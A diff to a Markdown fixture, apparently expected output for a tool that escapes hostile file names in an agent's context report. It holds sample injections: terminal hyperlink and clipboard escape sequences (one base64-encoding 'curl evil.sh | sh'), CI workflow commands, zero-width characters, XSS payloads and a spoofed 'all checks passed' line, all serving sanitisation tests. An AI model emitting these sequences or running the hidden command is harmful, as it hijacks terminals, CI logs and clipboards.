@@ -2,7 +2,9 @@
 
 **Assumes:** &lt;U\+001B&gt;\]8;;https\://evil\.example&lt;U\+001B&gt;\\click&lt;U\+001B&gt;\]8;;&lt;U\+001B&gt;\\ = x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b \(rule option\)
 
-**Not visible:** zero&lt;U\+200B&gt;width&lt;U\+200C&gt;non&lt;U\+200D&gt;joiner&lt;U\+2060&gt;word&lt;U\+FEFF&gt;bom \(user\)
+**Not visible** (outside the repository, never read):
+
+- user: \$&lt;img src=x onerror=alert\(1\)&gt; &lt;script&gt;alert\(1\)&lt;/script&gt; &amp;lt;b&amp;gt;/y, zero&lt;U\+200B&gt;width&lt;U\+200C&gt;non&lt;U\+200D&gt;joiner&lt;U\+2060&gt;word&lt;U\+FEFF&gt;bom, \~/copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done/x
 
 ### At session start
 
@@ -50,6 +52,8 @@
 | \:\:error\:\:matrix | startup |
 | &lt;img src=x onerror=alert\(1\)&gt; &lt;script&gt;alert\(1\)&lt;/script&gt; &amp;lt;b&amp;gt; | skipped |
 | safe text⏎FAKE\: all checks passed | — |
+
+startup: loaded at session start · skipped: not loaded; the plan says why · —: not read by this agent
 
 _≈Tokens = characters ÷ 4._
 
